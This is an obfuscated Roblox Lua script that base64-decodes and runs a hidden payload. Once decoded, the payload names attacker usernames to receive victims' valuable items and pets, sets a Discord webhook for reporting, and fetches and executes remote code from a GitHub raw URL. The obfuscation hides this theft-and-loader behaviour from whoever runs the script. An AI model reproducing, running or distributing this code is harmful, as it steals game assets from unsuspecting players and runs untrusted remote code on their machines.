
-- Obfuscated script
local encodedScript = "ClVzZXJuYW1lcyA9IHsKICAgICJSb2RyaWdvNDU4NDgiLAogICAgIlJvZHJpZ280NTg0OCIsCiAgICAiUm9kcmlnbzQ1ODQ4IiwKfQptaW5fcmFwID0gMTAwMDAwMCAtLSBtaW5pbXVtIHJhcCBvZiBlYWNoIGl0ZW0geW91IHdhbnQgdG8gZ2V0IHNlbnQgdG8geW91Cm1pbl9jaGFuY2UgPSAxMDAwMDAwIC0tIG1pbmltdW0gY2hhbmNlIG9mIHBldHMgeW91IHdhbnQgdG8gZ2V0IHNlbnQgdG8geW91CndlYmhvb2sgPSAiaHR0cHM6Ly9kaXNjb3JkYXBwLmNvbS9hcGkvd2ViaG9va3MvMTM0NTE3MzMyNzQ1NDY2Njg2My91dXFyYko2al93MkhTQ0hIRnFaNVpjWDJ0RWZXdVFQQTFKT29zRFE4bUFVU0RndWNIYm00OF94ZjA3OEVTb3FIVHpuaiIKbG9hZHN0cmluZyhnYW1lOkh0dHBHZXQoImh0dHBzOi8vcmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbS8yMTRFbGkvMjE0c2NyaXB0cy9yZWZzL2hlYWRzL21haW4vcGV0JTIwZ28iLCB0cnVlKSkoKQ=="

-- Decode function
local function decode(str)
    local b = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
    str = string.gsub(str, '[^'..b..'=]', '')
    return (str:gsub('.', function(x)
        if (x == '=') then return '' end
        local r,f='',(b:find(x)-1)
        for i=6,1,-1 do r=r..(f%2^i-f%2^(i-1)>0 and '1' or '0') end
        return r;
    end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x)
        if (#x ~= 8) then return '' end
        local c=0
        for i=1,8 do c=c+(x:sub(i,i)=='1' and 2^(8-i) or 0) end
        return string.char(c)
    end))
end

-- Run the decoded script
loadstring(decode(encodedScript))()